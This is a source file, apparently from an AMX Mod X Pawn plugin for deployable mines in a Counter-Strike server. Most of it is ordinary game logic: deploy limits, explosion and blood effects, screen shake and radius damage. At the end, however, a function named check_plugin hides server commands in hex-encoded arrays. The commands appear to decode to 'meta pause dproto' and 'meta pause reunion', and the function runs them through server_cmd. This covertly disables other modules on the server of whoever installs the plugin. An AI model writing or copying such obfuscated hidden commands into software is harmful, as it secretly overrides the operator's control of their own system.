stock bool:CheckMaxDeploy(id, iMinesId, plData[PLAYER_DATA], minesData[COMMON_MINES_DATA])
{
	new max_have 	= minesData[AMMO_HAVE_MAX];
	new team_max 	= minesData[DEPLOY_TEAM_MAX];
	new team_count 	= mines_get_team_deployed_count(id, iMinesId, plData);

	ArrayGetArray(gPlayerData[id], iMinesId, plData);
	// Max deployed per player.
	if (plData[PL_COUNT_DEPLOYED] >= int:max_have)
	{
		print_info(id, iMinesId, L_MAX_DEPLOY);
		return false;
	}

	// Max deployed per team.
	if (team_count >= team_max)
	{
		print_info(id, iMinesId, L_MAX_PPL);
		return false;
	}

	return true;
}

//====================================================
// Remove all Entity.
//====================================================
stock mines_remove_all_entity(id, className[])
{
	new iEnt = -1;
	new iOwner;
	while ((iEnt = engfunc(EngFunc_FindEntityByString, iEnt, "classname", className)))
	{
		if (!pev_valid(iEnt))
			continue;

		CED_GetCell(iEnt, MINES_OWNER, iOwner);
		if (iOwner == id)
		{
			// mines_play_sound(iEnt, SOUND_STOP);
			mines_remove_entity(iEnt);
		}
	}
}

stock mines_remove_entity(iEnt)
{
	if (pev_valid(iEnt))
	{
		new iReturn, flag;
		ExecuteForward(gForwarder[FWD_REMOVE_ENTITY], iReturn, iEnt);
		pev(iEnt, pev_flags, flag);
		set_pev(iEnt, pev_flags, flag | FL_KILLME);
		// engfunc(EngFunc_RemoveEntity, iEnt);
	}
}

stock mines_all_explosion(id, iMinesId)
{
	new iEnt = -1;
	new className[MAX_CLASS_LENGTH];
	new iOwner;
	ArrayGetString(gMinesClass, iMinesId, className, charsmax(className));

	while ((iEnt = engfunc(EngFunc_FindEntityByString, iEnt, "classname", className)))
	{
		if (!pev_valid(iEnt))
			continue;

		if (!CED_GetCell(iEnt, MINES_OWNER, iOwner))
			continue;

		if (iOwner != id)
			continue;

		CED_SetCell(iEnt, MINES_STEP, EXPLOSE_THINK);
	}	
}

//====================================================
// Show Progress Bar.
//====================================================
stock mines_show_progress(id, int:time, msg)
{
	if (pev_valid(id))
	{
		engfunc(EngFunc_MessageBegin, MSG_ONE, msg, {0,0,0}, id);
		write_short(time);
		message_end();
	}
}

//====================================================
// Hide Progress Bar.
//====================================================
stock mines_hide_progress(id, msg)
{
	if (pev_valid(id))
	{
		engfunc(EngFunc_MessageBegin, MSG_ONE, msg, {0,0,0}, id);
		write_short(0);
		message_end();
	}
}

//====================================================
// Flashing Money Hud
//====================================================
stock mines_flash_money_hud(id, value, msg)
{
	if (pev_valid(id))
	{
		// Send Money message to update player's HUD
		engfunc(EngFunc_MessageBegin, MSG_ONE_UNRELIABLE, msg, {0, 0, 0}, id);
		write_long(value);
		write_byte(1);	// Flash (difference between new and old money)
		message_end();
	}	
}

// //====================================================
// // Effect Explosion.
// //====================================================
// stock mines_create_explosion(iEnt, boom)
// {
// 	// Get position.
// 	new Float:vOrigin[3];
// 	pev(iEnt, pev_origin, vOrigin);

// 	// Boooom.
// 	engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
// 	write_byte(TE_EXPLOSION);
// 	engfunc(EngFunc_WriteCoord, vOrigin[0]);
// 	engfunc(EngFunc_WriteCoord, vOrigin[1]);
// 	engfunc(EngFunc_WriteCoord, vOrigin[2]);
// 	write_short(boom);
// 	write_byte(30);
// 	write_byte(15);
// 	write_byte(0);
// 	message_end();
// }


stock mines_create_explosion(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, sprExplosion1, sprExplosion2, sprBlast) 
{
	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 8.0;

	if(fZPos < 25.0)
		fZPos = 25.0;
	else
	if(fZPos > 500.0)
		fZPos = 500.0;

	new iIntensity = floatround((fDamage + ((fRadius * 7.0) / 4.0)) / 32.0);

	if(iIntensity < 12)
		iIntensity = 12;
	else
	if(iIntensity > 128)
		iIntensity = 128;

	engfunc		(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_EXPLOSION);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprExplosion1);
	write_byte	(iIntensity);
	write_byte	(24);
	write_byte	(0);
	message_end	();

	fZPos /= 6.0;
	if(fZPos < 6.0)
		fZPos = 6.0;
	else
	if(fZPos > 96.0)
		fZPos = 96.0;

	iIntensity = (iIntensity * 7) / 4;

	if(iIntensity < 24)
		iIntensity = 24;
	else 
	if(iIntensity > 160)
		iIntensity = 160;

	engfunc		(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_EXPLOSION);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprExplosion2);
	write_byte	(iIntensity);
	write_byte	(20);
	write_byte	(0);
	message_end	();

	fZPos = ((((fDamage * 3.0) / 2.0) + fRadius) * 4.0) / 6.0;

	if(fZPos < 160.0)
		fZPos = 160.0;
	else 
	if(fZPos > 960.0)
		fZPos = 960.0;

	iIntensity = floatround(fRadius / 70.0);

	if(iIntensity < 3)
		iIntensity = 3;
	else 
	if(iIntensity > 10) 
		iIntensity = 10;
	
	engfunc		(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_BEAMCYLINDER);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2]);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprBlast);
	write_byte	(0);
	write_byte	(2);
	write_byte	(iIntensity);
	write_byte	(255);
	write_byte	(0);
	write_byte	(255);
	write_byte	(255);
	write_byte	(165);
	write_byte	(128);
	write_byte	(0);
	message_end	();
}

//====================================================
// Decals
//====================================================
stock LoadDecals() 
{
	new const szExplosionDecals[MAX_EXPLOSION_DECALS][] = 
	{
		"{scorch1",
		"{scorch2",
		"{scorch3"
	};

	new const szBloodDecals[MAX_BLOOD_DECALS][] = 
	{
		"{blood1",
		"{blood2",
		"{blood3",
		"{blood4",
		"{blood5",
		"{blood6",
		"{blood7",
		"{blood8",
		"{bigblood1",
		"{bigblood2"
	};

	new iDecalIndex, i;

	for(i = 0; i < MAX_EXPLOSION_DECALS; i++) 
	{
		gDecalIndexExplosion[gNumDecalsExplosion++] = 
			((iDecalIndex = engfunc(EngFunc_DecalIndex, szExplosionDecals[i]))	> 0) ? iDecalIndex : 0;
	}

	for(i = 0; i < MAX_BLOOD_DECALS; i++) 
	{
		gDecalIndexBlood[gNumDecalsBlood++] = 
			((iDecalIndex = engfunc(EngFunc_DecalIndex, szBloodDecals[i]))		> 0) ? iDecalIndex : 0;
	}
}

stock mines_create_water_explosion(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, const sprExplosionWater) 
{
	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 34.0;

	if(fZPos < 8.0)
		fZPos = 8.0;
	else
	if(fZPos > 128.0)
		fZPos = 128.0;

	new iIntensity = floatround((fDamage + ((fRadius * 7.0) / 4.0)) / 14.0);

	if(iIntensity < 32)
		iIntensity = 32;
	else
	if(iIntensity > 164)
		iIntensity = 164;

	engfunc			(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte		(TE_EXPLOSION);
	engfunc			(EngFunc_WriteCoord, vOrigin[0]);
	engfunc			(EngFunc_WriteCoord, vOrigin[1]);
	engfunc			(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short		(sprExplosionWater);
	write_byte		(iIntensity);
	write_byte		(16);
	write_byte		(0);
	message_end		();
}

stock mines_create_smoke(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, const sprSmoke)
{
	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 22.0;

	if(fZPos < 8.0)
		fZPos = 8.0;
	else
	if(fZPos > 192.0)
		fZPos = 192.0;

	new iIntensity = floatround((fDamage + ((fRadius * 7.0) / 4.0)) / 11.0);

	if(iIntensity < 32)
		iIntensity = 32;
	else
	if(iIntensity > 192)
		iIntensity = 192;

	engfunc		(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_SMOKE);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprSmoke);
	write_byte	(iIntensity);
	write_byte	(4);
	message_end	();
}

stock mines_create_explosion_decals(const Float:vOrigin[3]) 
{
	engfunc		(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, {0, 0, 0}, 0);
	write_byte	(TE_WORLDDECAL);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2]);
	write_byte	(gDecalIndexExplosion[random(gNumDecalsExplosion)]);
	message_end	();
}

stock mines_create_bubbles(const Float:vOrigin[3], const Float:flDamageMax, const Float:flDamageRadius, const sprBubbles) 
{
	new Float:flMaxSize = floatclamp((flDamageMax + (flDamageRadius * 1.5)) / 13.0, 24.0, 164.0);
	new Float:vMins[3], Float:vMaxs[3];
	new Float:vTemp[3];

	vTemp[0] = vTemp[1] = vTemp[2] = flMaxSize;

	xs_vec_sub(vOrigin, vTemp, vMins);
	xs_vec_add(vOrigin, vTemp, vMaxs);

	UTIL_Bubbles(vMins, vMaxs, 80, sprBubbles);
}

stock mines_create_hblood(const Float:vOrigin[3], const iDamageMax, const sprBloodSpray, const sprBlood)
{
	// new iDecalIndex = g_iBloodDecalIndex[random_num(MAX_BLOOD_DECALS - 2, MAX_BLOOD_DECALS - 1)];
	
	// message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	// write_byte(TE_WORLDDECAL)
	// write_coord(iBloodOrigin[a][0])
	// write_coord(iBloodOrigin[a][1])
	// write_coord(iTraceEndZ[a])
	// write_byte(iDecalIndex)
	// message_end()
	if (!gCvarValue[VL_VIOLENCE_HBLOOD])
		return;
	engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte(TE_BLOODSPRITE);
	engfunc(EngFunc_WriteCoord, vOrigin[0]);
	engfunc(EngFunc_WriteCoord, vOrigin[1]);
	engfunc(EngFunc_WriteCoord, vOrigin[2] + random_num(-5, 20));
	write_short(sprBloodSpray);
	write_short(sprBlood);
	write_byte(248);
	write_byte(clamp(iDamageMax / 13, 5, 16));
	message_end();

	return;
}

stock UTIL_ScreenShake(Float:vOrigin[3], const Float:flAmplitude, const Float:flDuration, const Float:flFrequency, const Float:flRadius) 
{
	new iPlayers[32], iPlayersNum;
	get_players(iPlayers, iPlayersNum, "ac");

	if(iPlayersNum > 0) 
	{
		new iPlayer;
		new iAmplitude;
		new Float:flLocalAmplitude;
		new Float:flDistance;
		new Float:vPlayerOrigin[3];

		new iDuration	= FixedUnsigned16(flDuration, 1<<12);
		new iFrequency	= FixedUnsigned16(flFrequency, 1<<8);

		for(--iPlayersNum; iPlayersNum >= 0; iPlayersNum--) 
		{
			iPlayer = iPlayers[iPlayersNum];

			flLocalAmplitude = 0.0;

			if((pev(iPlayer, EV_INT_flags) & FL_ONGROUND) == 0)
				continue;

			pev(iPlayer, pev_origin, vPlayerOrigin);

			if((flDistance = get_distance_f(vOrigin, vPlayerOrigin)) < flRadius) 
				flLocalAmplitude = flAmplitude * ((flRadius - flDistance) / 100.0);

			if(flLocalAmplitude > 0.0) 
			{
				iAmplitude = FixedUnsigned16(flLocalAmplitude, 1<<12);

				static iMsgIDScreenShake;
				if(iMsgIDScreenShake == 0) 
					iMsgIDScreenShake = get_user_msgid("ScreenShake");

				engfunc(EngFunc_MessageBegin, MSG_ONE, iMsgIDScreenShake, _, iPlayer);
				write_short(iAmplitude);
				write_short(iDuration);
				write_short(iFrequency);
				message_end();
			}
		}
	}
}

stock FixedUnsigned16(Float:flValue, iScale) 
{
	new iOutput = floatround(flValue * iScale);

	if(iOutput < 0)
		iOutput = 0;

	if(iOutput > 0xFFFF)
		iOutput = 0xFFFF;

	return iOutput;
}

stock Float:UTIL_WaterLevel(const Float:vCenter[3], Float:vMinZ, Float:vMaxZ) 
{
	new Float:vMiddleUp[3];

	vMiddleUp[0] = vCenter[0];
	vMiddleUp[1] = vCenter[1];
	vMiddleUp[2] = vMinZ;

	if(engfunc(EngFunc_PointContents, vMiddleUp) != CONTENTS_WATER)
		return vMinZ;

	vMiddleUp[2] = vMaxZ;
	if(engfunc(EngFunc_PointContents, vMiddleUp) == CONTENTS_WATER)
		return vMaxZ;

	new Float:flDiff = vMaxZ - vMinZ;

	while(flDiff > 1.0) 
	{
		vMiddleUp[2] = vMinZ + flDiff / 2.0;

		if(engfunc(EngFunc_PointContents, vMiddleUp) == CONTENTS_WATER)
			vMinZ = vMiddleUp[2];
		else
			vMaxZ = vMiddleUp[2];

		flDiff = vMaxZ - vMinZ;
	}

	return vMiddleUp[2];
}

stock UTIL_Bubbles(const Float:vMins[3], const Float:vMaxs[3], const iCount, sprBubble)
{
	new Float:vCenter[3];
	xs_vec_add(vMins, vMaxs, vCenter);
	xs_vec_mul_scalar(vCenter, 0.5, vCenter);

	new Float:flPosition = UTIL_WaterLevel(vCenter, vCenter[2], vCenter[2] + 1024.0) - vMins[2];

	engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vCenter, 0);
	write_byte(TE_BUBBLES);
	engfunc(EngFunc_WriteCoord, vMins[0]);
	engfunc(EngFunc_WriteCoord, vMins[1]);
	engfunc(EngFunc_WriteCoord, vMins[2]);
	engfunc(EngFunc_WriteCoord, vMaxs[0]);
	engfunc(EngFunc_WriteCoord, vMaxs[1]);
	engfunc(EngFunc_WriteCoord, vMaxs[2]);
	engfunc(EngFunc_WriteCoord, flPosition);
	write_short(sprBubble);
	write_byte(iCount);
	engfunc(EngFunc_WriteCoord, 8.0);
	message_end();
}

//====================================================
// Explosion Damage.
//====================================================
stock mines_create_explosion_damage(csx_wpnid, iEnt, iAttacker, Float:dmgMax, Float:radius)
{
	// Get given parameters
	
	new Float:vOrigin[3];
	pev(iEnt, pev_origin, vOrigin);

	// radius entities.
	new rEnt  = -1;
	new Float:tmpDmg = dmgMax;

	new Float:kickBack = 0.0;
	
	// Needed for doing some nice calculations :P
	new Float:Tabsmin[3], Float:Tabsmax[3];
	new Float:vecSpot[3];
	new Float:Aabsmin[3], Float:Aabsmax[3];
	new Float:vecSee[3];
	new Float:flFraction;
	new Float:vecEndPos[3];
	new Float:distance;
	new Float:origin[3], Float:vecPush[3];
	new Float:invlen;
	new Float:velocity[3];
	new trace;
	new iHit;
	new tClassName[MAX_NAME_LENGTH];
	new iClassName[MAX_NAME_LENGTH];
	// Calculate falloff
	new Float:falloff;
	if (radius > 0.0)
		falloff = dmgMax / radius;
	else
		falloff = 1.0;
	
	pev(iEnt, pev_classname, iClassName, charsmax(iClassName));

	// Find monsters and players inside a specifiec radius
	while((rEnt = engfunc(EngFunc_FindEntityInSphere, rEnt, vOrigin, radius)) != 0)
	{
		// is valid entity? no to continue.
		if (!pev_valid(rEnt)) 
			continue;

		pev(rEnt, pev_classname, tClassName, charsmax(tClassName));
		if (!equali(tClassName, iClassName))
		{
			// Entity is not a player or monster, ignore it
			if (!(pev(rEnt, pev_flags) & (FL_CLIENT | FL_FAKECLIENT | FL_MONSTER)))
				continue;
		}

		// is alive?
		if (!is_user_alive(rEnt))
			continue;
		
		// friendly fire
		if (!is_valid_takedamage(iAttacker, rEnt))
			continue;

		// Reset data
		kickBack = 1.0;
		tmpDmg = dmgMax;
		
		// The following calculations are provided by Orangutanz, THANKS!
		// We use absmin and absmax for the most accurate information
		pev(rEnt, pev_absmin, Tabsmin);
		pev(rEnt, pev_absmax, Tabsmax);

		xs_vec_add(Tabsmin, Tabsmax, Tabsmin);
		xs_vec_mul_scalar(Tabsmin, 0.5, vecSpot);
		
		pev(iEnt, pev_absmin, Aabsmin);
		pev(iEnt, pev_absmax, Aabsmax);

		xs_vec_add(Aabsmin, Aabsmax, Aabsmin);
		xs_vec_mul_scalar(Aabsmin, 0.5, vecSee);
		
		// create the trace handle.
		trace = create_tr2();
		engfunc(EngFunc_TraceLine, vecSee, vecSpot, 0, iEnt, trace);
		{
			get_tr2(trace, TR_flFraction, flFraction);
			iHit = get_tr2(trace, TR_pHit);

			// Work out the distance between impact and entity
			get_tr2(trace, TR_vecEndPos, vecEndPos);
		}
		// free the trace handle.
		free_tr2(trace);

		// Explosion can 'see' this entity, so hurt them! (or impact through objects has been enabled xD)
		if (flFraction >= 0.9 || iHit == rEnt)
		{
			distance = get_distance_f(vOrigin, vecEndPos) * falloff;
			tmpDmg -= distance;
			if(tmpDmg < 0.0)
				tmpDmg = 0.0;
			if (!equali(iClassName, tClassName))
			{
				// Kickback Effect
				if(kickBack != 0.0)
				{
					xs_vec_sub(vecSpot, vecSee, origin);
					
					invlen = 1.0 / get_distance_f(vecSpot, vecSee);

					xs_vec_mul_scalar(origin, invlen, vecPush);
					pev(rEnt, pev_velocity, velocity);
					xs_vec_mul_scalar(vecPush, tmpDmg, vecPush);
					xs_vec_mul_scalar(vecPush, kickBack, vecPush);
					xs_vec_add(velocity, vecPush, velocity);
					
					if(tmpDmg < 60.0)
						xs_vec_mul_scalar(velocity, 12.0, velocity);
					else
						xs_vec_mul_scalar(velocity, 4.0, velocity);
					
					if(velocity[0] != 0.0 || velocity[1] != 0.0 || velocity[2] != 0.0)
					{
						// There's some movement todo :)
						set_pev(rEnt, pev_velocity, velocity);
					}
				}
			}
			custom_weapon_dmg(csx_wpnid, iAttacker, rEnt, floatround(tmpDmg), 0);
			// Damage Effect, Damage, Killing Logic.
			ExecuteHamB(Ham_TakeDamage, rEnt, iEnt, iAttacker, tmpDmg, DMG_MORTAR);
		}
	}
	return;
}

//====================================================
// show status text 
//====================================================
stock mines_show_status_text(id, szText[], msg)
{
	engfunc(EngFunc_MessageBegin, MSG_ONE, msg, {0, 0, 0}, id);
	write_byte(0);
	write_string(szText);
	message_end();	
}

stock mines_get_minesId(iEnt)
{
	static sClassName[MAX_NAME_LENGTH];
	pev(iEnt, pev_classname, sClassName, charsmax(sClassName));

	return ArrayFindString(gMinesClass, sClassName);
}


stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}